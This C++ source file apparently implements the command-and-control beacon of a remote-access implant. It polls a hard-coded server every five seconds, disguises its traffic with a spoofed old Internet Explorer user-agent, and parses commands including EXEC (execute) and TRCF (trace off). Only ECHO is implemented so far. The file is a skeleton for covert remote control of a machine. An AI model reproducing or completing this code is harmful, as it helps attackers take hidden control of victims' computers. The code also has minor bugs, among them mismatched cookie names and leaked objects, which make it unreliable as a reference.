#include "ServerConnection.h"

std::string ServerConnection::_serverAddress = "http://192.168.1.130";

// This function extract sessionID cookie from Set-Cookie header
std::string ServerConnection::extractSessionId(http::Response request)
{
    for (auto &header : request.headers)
    {
        std::size_t pos = header.find("sessionId=");
        if (pos < header.size())
        {
            return header.substr(pos + 10);
        }
    }
    return std::string();
}

// This function finds the compatible enum for the command type
ServerConnection::commands ServerConnection::extractCommandType(http::Response request)
{
    std::string content = std::string(request.body.begin(), request.body.end());
    std::string commandTypeStr = content.substr(0, COMMAND_TYPE_LEN);
    if (commandTypeStr == "EXEC")
    {
        return EXEC;
    }
    else if (commandTypeStr == "EXIT")
    {
        return EXIT;
    }
    else if (commandTypeStr == "INFO")
    {
        return INFO;
    }
    else if (commandTypeStr == "ECHO")
    {
        return ECHO;
    }
    else if (commandTypeStr == "TRCF")
    {
        return TRACEOFF;
    }
    else
    {
        return UNKNOWN;
    }
}

// This function extracts the parameters for the command
std::string ServerConnection::extractParameters(http::Response request)
{
    std::string content = std::string(request.body.begin(), request.body.end());
    
    if (content.size() > COMMAND_TYPE_LEN)
    {
        return content.substr(COMMAND_TYPE_LEN + 1, content.size() - 1);
    }
    return std::string();
}

// This function parse required data from server request
ServerConnection::Request* ServerConnection::parsingRequest(http::Response request)
{
    Request* requestSt = new Request();

    requestSt->sessionId = this->extractSessionId(request);  // Extracting Set-Cookie for responding
    requestSt->commandType = this->extractCommandType(request);
    if (requestSt->commandType == UNKNOWN)
    {
        return nullptr;
    }
    requestSt->params = this->extractParameters(request);

    return requestSt;
}

// This function generate response according to server request
ServerConnection::Response ServerConnection::handleRequest(ServerConnection::Request* request)
{
    Response responseSt;
    responseSt.sessionId = request->sessionId;

    switch (request->commandType)
    {
    case ECHO:
        Log::log("Responsing to ECHO request.");
        responseSt.content = request->params;
        break;
    default:
        Log::log("Responsing to Not Implemented request.");
        responseSt.content = "Not Implemented Yet:/";
        break;
    }

    return responseSt;
}

// This function receivr and handle server requests
ConnectionHandler* ServerConnection::run(void)
{
    try
    {
        while (true)
        {
            http::Request request(ServerConnection::_serverAddress);
            http::Response response = request.send("GET", "", { "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" });
            Request* requestSt = this->parsingRequest(response);
            if (requestSt)
            {
                Response responseSt = this->handleRequest(requestSt);
                response = request.send("POST", responseSt.content, { "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)", "Cookie: sessionID=" + responseSt.sessionId });
                Log::log("Responed Successfuly.");
            }
            else
            {
                Log::log("Unknown Command Type -> No Responding");
            }
            
            Sleep(5000);
        }
    }
    catch (...)
    {
        Log::log("Conection with Server Failed.");
        return nullptr;
    }
}
